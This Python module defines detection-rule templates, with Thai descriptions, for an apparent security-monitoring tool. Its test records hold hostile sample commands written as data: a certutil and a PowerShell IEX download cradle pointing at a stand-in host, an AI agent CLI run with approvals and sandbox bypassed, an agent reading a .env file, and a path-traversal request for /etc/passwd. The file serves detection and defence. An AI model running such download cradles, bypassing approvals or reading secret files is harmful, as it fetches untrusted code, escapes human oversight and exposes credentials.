"""Vetted starting points for custom (CUS) rules, in the local rule language of app.phase4.

Each template is a complete rule plus test cases (one that must match, one that must not), so loading it in the
AI Rule Assistant immediately shows validation, test results and a back-test against recent logs. Nothing here
runs until someone saves it and a lead publishes it.
"""

TEMPLATES = [
    {"id": "lolbin-certutil", "name": "certutil ดาวน์โหลดไฟล์ (LOLBin)",
     "why": "ผู้โจมตีใช้เครื่องมือของ Windows ดาวน์โหลด payload เพื่อหลบ antivirus",
     "rule": {"kind": "process", "match": "all", "title": "certutil used to download a file", "severity": "high",
              "technique": "T1105", "tactic": "Command and Control",
              "conditions": [{"field": "image", "op": "contains", "value": "certutil"},
                             {"field": "cmdline", "op": "regex", "value": "urlcache|verifyctl"}]},
     "tests": [({"image": "C:\\Windows\\System32\\certutil.exe", "cmdline": "certutil -urlcache -split -f http://x.example/a.exe a.exe"}, True),
               ({"image": "certutil.exe", "cmdline": "certutil -hashfile report.pdf SHA256"}, False)]},
    {"id": "ps-cradle", "name": "PowerShell download cradle",
     "why": "PowerShell ที่ดาวน์โหลดและรันโค้ดในหน่วยความจำ — ขั้นแรกของ malware จำนวนมาก",
     "rule": {"kind": "process", "match": "all", "title": "PowerShell download cradle", "severity": "high",
              "technique": "T1059.001", "tactic": "Execution",
              "conditions": [{"field": "image", "op": "contains", "value": "powershell"},
                             {"field": "cmdline", "op": "regex", "value": "downloadstring|downloadfile|invoke-webrequest|iwr |net\\.webclient|iex"}]},
     "tests": [({"image": "powershell.exe", "cmdline": "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x.example/p')"}, True),
               ({"image": "powershell.exe", "cmdline": "powershell Get-Service"}, False)]},
    {"id": "ai-cli-yolo", "name": "AI agent CLI ที่ปิดการขออนุมัติ",
     "why": "coding agent ที่รันแบบ bypass approvals ทำอะไรก็ได้โดยไม่มีคนยืนยัน",
     "rule": {"kind": "process", "match": "any", "title": "AI agent CLI with approvals disabled", "severity": "high",
              "technique": "T1059", "tactic": "Execution",
              "conditions": [{"field": "cmdline", "op": "contains", "value": "dangerously-bypass"},
                             {"field": "cmdline", "op": "contains", "value": "--yolo"},
                             {"field": "cmdline", "op": "contains", "value": "dangerously-skip-permissions"}]},
     "tests": [({"image": "codex", "cmdline": "codex exec --dangerously-bypass-approvals-and-sandbox 'scan'"}, True),
               ({"image": "codex", "cmdline": "codex exec 'write tests'"}, False)]},
    {"id": "scanner", "name": "เครื่องมือสแกนเครือข่ายบนเครื่องผู้ใช้",
     "why": "nmap / masscan บนเครื่องที่ไม่ใช่ของทีม security มักเป็น recon ภายใน",
     "rule": {"kind": "process", "match": "all", "title": "Network scanner executed", "severity": "medium",
              "technique": "T1046", "tactic": "Discovery",
              "conditions": [{"field": "image", "op": "regex", "value": "(^|[\\\\/])(nmap|masscan|naabu|rustscan|zmap)(\\.exe)?$"}]},
     "tests": [({"image": "nmap", "cmdline": "nmap -sV 10.0.0.0/24"}, True), ({"image": "notepad.exe"}, False)]},
    {"id": "oast", "name": "ติดต่อโดเมน OAST / out-of-band",
     "why": "การทดสอบช่องโหว่และ exploit แบบ blind มักยิงกลับมาที่ interactsh / oast.*",
     "rule": {"kind": "net", "match": "all", "title": "Out-of-band (OAST) callback", "severity": "medium",
              "technique": "T1071.004", "tactic": "Command and Control",
              "conditions": [{"field": "dest", "op": "regex", "value": "\\.(oast\\.(fun|live|site|online|pro|me)|interact\\.sh|burpcollaborator\\.net)$"}]},
     "tests": [({"dest": "abc123.oast.fun", "port": 53}, True), ({"dest": "www.example.com", "port": 443}, False)]},
    {"id": "agent-secrets", "name": "AI agent อ่านไฟล์ลับ ≥ 3 ครั้งใน 5 นาที",
     "why": "agent ที่ถูก prompt injection มักถูกสั่งให้อ่าน .env / key แล้วส่งออก",
     "rule": {"kind": "agent", "match": "all", "title": "AI agent repeatedly read secret files", "severity": "high",
              "technique": "T1552.001", "tactic": "Credential Access",
              "conditions": [{"field": "kind", "op": "equals", "value": "tool_call"},
                             {"field": "args", "op": "regex", "value": "\\.env|id_rsa|credentials|secrets?\\.(json|ya?ml)"}],
              "threshold": {"count": 3, "window_sec": 300, "group_by": "agent"}},
     "tests": [({"agent": "support-copilot", "kind": "tool_call", "tool": "fs.read", "args": "path=/app/.env"}, True),
               ({"agent": "support-copilot", "kind": "tool_call", "tool": "kb.search", "args": "query=vpn"}, False)]},
    {"id": "rmm", "name": "ติดตั้ง / รันเครื่องมือ remote access",
     "why": "AnyDesk / ScreenConnect ถูกใช้คงการเข้าถึงหลังเจาะระบบ (และในแก๊ง call-center)",
     "rule": {"kind": "process", "match": "all", "title": "Remote access tool executed", "severity": "medium",
              "technique": "T1219", "tactic": "Command and Control",
              "conditions": [{"field": "image", "op": "regex", "value": "anydesk|teamviewer|rustdesk|screenconnect|atera|splashtop"}]},
     "tests": [({"image": "C:\\Users\\a\\Downloads\\AnyDesk.exe"}, True), ({"image": "chrome.exe"}, False)]},
    {"id": "big-egress", "name": "ส่งข้อมูลออก > 100 MB ในครั้งเดียว",
     "why": "ปริมาณส่งออกผิดปกติ อาจเป็นการขโมยข้อมูล",
     "rule": {"kind": "net", "match": "all", "title": "Large outbound transfer (>100 MB)", "severity": "medium",
              "technique": "T1048", "tactic": "Exfiltration",
              "conditions": [{"field": "bytes_out", "op": "gte", "value": "100000000"}]},
     "tests": [({"dest": "files.example.net", "bytes_out": 250000000}, True), ({"dest": "x.example", "bytes_out": 5000}, False)]},
    {"id": "bruteforce", "name": "logon ล้มเหลว ≥ 10 ครั้งจาก IP เดียวใน 5 นาที",
     "why": "brute force / password spraying (Windows event 4625)",
     "rule": {"kind": "logon", "match": "all", "title": "Repeated failed logons from one source", "severity": "medium",
              "technique": "T1110", "tactic": "Credential Access",
              "conditions": [{"field": "event_id", "op": "equals", "value": "4625"}],
              "threshold": {"count": 10, "window_sec": 300, "group_by": "src_ip"}},
     "tests": [({"event_id": 4625, "src_ip": "198.51.100.4", "user": "admin"}, True), ({"event_id": 4624, "user": "admin"}, False)]},
    {"id": "db-dump", "name": "ดึงข้อมูลจากฐานข้อมูล ≥ 100,000 แถว",
     "why": "การ export ข้อมูลลูกค้าจำนวนมาก — เกี่ยวกับ PDPA โดยตรง",
     "rule": {"kind": "db", "match": "all", "title": "Bulk database export (≥100k rows)", "severity": "high",
              "technique": "T1213", "tactic": "Collection",
              "conditions": [{"field": "rows", "op": "gte", "value": "100000"}]},
     "tests": [({"db": "crm", "user": "app", "rows": 450000, "statement": "SELECT * FROM customers"}, True),
               ({"db": "crm", "rows": 20}, False)]},
    {"id": "web-probe", "name": "เว็บถูกยิงหาไฟล์ลับ / path traversal",
     "why": "scanner และ AI pentest agent ไล่หา .env, .git, /etc/passwd",
     "rule": {"kind": "http", "match": "all", "title": "Sensitive file / traversal probe", "severity": "medium",
              "technique": "T1190", "tactic": "Initial Access",
              "conditions": [{"field": "uri", "op": "regex", "value": "\\.\\./|/etc/passwd|/\\.git/|/\\.env|wp-config\\.php"}]},
     "tests": [({"uri": "/static/../../etc/passwd", "src_ip": "203.0.113.9"}, True), ({"uri": "/index.html"}, False)]},
]


def public() -> list[dict]:
    """Templates ready for the editor: rule + test cases in the assistant's format."""
    out = []
    for t in TEMPLATES:
        rule = {"threshold": {"count": 0, "window_sec": 0, "group_by": ""}, **t["rule"]}
        out.append({"id": t["id"], "name": t["name"], "why": t["why"], "rule": rule,
                    "test_cases": [{"description": ("ควรเจอ" if hit else "ไม่ควรเจอ"), "record": rec, "should_match": hit}
                                   for rec, hit in t["tests"]]})
    return out
